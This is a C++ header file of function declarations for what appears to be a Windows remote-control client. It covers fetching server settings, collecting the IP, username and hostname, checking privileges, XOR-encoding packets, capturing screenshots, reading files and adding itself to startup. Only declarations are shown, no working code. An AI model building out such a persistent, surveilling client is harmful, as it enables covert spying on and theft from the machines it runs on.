#pragma once
#include <string>
#include <time.h>
#include <Lmcons.h>
#include <nlohmann/json.hpp>
#include <random>
#include <ctime>
#include <cmath>
#include <tchar.h>

using namespace nlohmann;
using namespace std;

extern const string DEC_ASCII;

// override behvoir of string object to double strings
string operator * (string a, int b);
// random ascii letters by: legnth, minimum, payload of characters 
// behavior: EMPTY STRING //* when result -int
string random_ascii(int lng, string payload = "");

// get setting from server 
json get_setting_from_server();
// get ip from third party
string get_public_ip();
// get name of currently user
string getlogin();
// get local hostname 
string t_gethostname();
// verify privilege
bool is_elevated_access();
// get windows version (just name)
string get_platform_name();

class B2Hex {

public:
	static string a2b_hex(const string&);

	static string b2a_hex(const string&);
};

// xor encrypt
char* x0r(string key, char* value, size_t x0rlen);

pair<json, char*> GetBlockPacket(char* packet, size_t lpacket, bool ignore = true);

char* SetBlockPacket(json info, char* binary, size_t lbinary, size_t&size_packet);
// role: like python behavoir: string[start:end];
char* subchar(char* memb, unsigned int start, unsigned int stop, size_t ln);

// role: split char* var like socket buffer or other binary, by delimiter that exist on buffer
list<pair<unsigned int, char*>> split42chars(char* memb, const char* delimiter, size_t l);

char* concatenate3chars_proto(const char* _json, const char* binary, size_t, size_t);

char* concatenate_to_char_ptr(list<pair<size_t, char*>>& binary, size_t lvector, bool deallocate=true);

void deallocate_receive_proto(list<pair<size_t, char*>>&packet);

/* SCREENSHOT ANALYZE */
pair<size_t, list<pair<size_t, char*>>> set_X_parts_image(map<string, pair<size_t, char*>>&, int quality=50, int xb=3, int w=1980, int h=1080);

pair<size_t, char*> get_img_24_bit_jpg(int w, int h, int quality = 50, bool v = false, int l=0, int t=0, int r=0, int b=0);

/* FILES */
size_t get_file_size(const char* path);

// invalid when file is bigger!
char* read_from_file(const char* path, size_t&);

pair<char*, TCHAR*> get_tempfile();


// KEYs for startup nood 
unsigned int set_startup_tuna();

bool is_set_startup();

// get name of exe file when start
int getTunaName(wchar_t* tn);
// kill process
int kill_tuna();
